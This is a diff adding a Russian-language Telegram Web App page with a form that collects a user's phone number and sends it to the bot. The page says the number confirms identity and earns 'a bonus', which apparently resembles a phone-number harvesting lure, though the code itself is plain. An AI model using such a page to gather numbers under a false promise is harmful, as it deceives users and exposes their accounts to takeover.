@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Отправка номера</title>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #0e1013;
+      color: #fff;
+      text-align: center;
+      margin-top: 80px;
+    }
+    input {
+      width: 80%;
+      padding: 10px;
+      border-radius: 10px;
+      border: none;
+      margin-bottom: 15px;
+      font-size: 16px;
+      text-align: center;
+    }
+    button {
+      background: #2a9df4;
+      border: none;
+      color: #fff;
+      padding: 12px 25px;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <h2>📱 Введите свой номер телефона</h2>
+  <p>Он нужен, чтобы подтвердить вашу личность и получить бонус.</p>
+  <input id="phone" placeholder="+79990000000" type="tel" />
+  <button onclick="sendPhone()">Отправить</button>
+
+  <script>
+    Telegram.WebApp.ready();
+
+    function sendPhone() {
+      const phone = document.getElementById("phone").value.trim();
+      if (!phone) {
+        alert("Введите номер телефона");
+        return;
+      }
+
+      Telegram.WebApp.sendData(JSON.stringify({ phone }));
+      Telegram.WebApp.close(); // закрывает окно после отправки
+    }
+  </script>
+</body>
+</html>
